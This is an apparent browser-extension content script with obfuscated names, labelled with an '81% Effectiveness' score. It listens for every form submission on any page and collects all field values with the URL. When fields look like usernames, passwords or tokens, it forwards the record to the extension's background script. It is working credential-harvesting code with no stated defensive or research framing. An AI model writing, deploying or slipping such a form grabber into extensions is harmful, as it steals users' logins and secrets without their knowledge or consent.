// Content Script - Optimized Balanced Configuration (81% Effectiveness)
(function () {
    'use strict';

    const _0xce = {
        _0x1() {
            this._0x2();
        },

        _0x2() {
            document.addEventListener('submit', (event) => {
                const _0f = event.target;
                if (!_0f || _0f.tagName !== 'FORM') return;

                const _0fd = new FormData(_0f);
                const _0cd = {
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    fields: {}
                };

                let _0hc = false;
                for (let [key, value] of _0fd.entries()) {
                    _0cd.fields[key] = value;
                    if (typeof FieldClassifier !== 'undefined') {
                        const _0fc = FieldClassifier._0f1({ name: key, id: key, value: value });
                        if (_0fc === 'u' || _0fc === 'p' || _0fc === 't') _0hc = true;
                    }
                }

                if (_0hc) {
                    chrome.runtime.sendMessage({
                        type: 'FORM_SUBMIT',
                        data: _0cd
                    });
                }
            }, true);
        }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => _0xce._0x1());
    } else {
        _0xce._0x1();
    }
})();
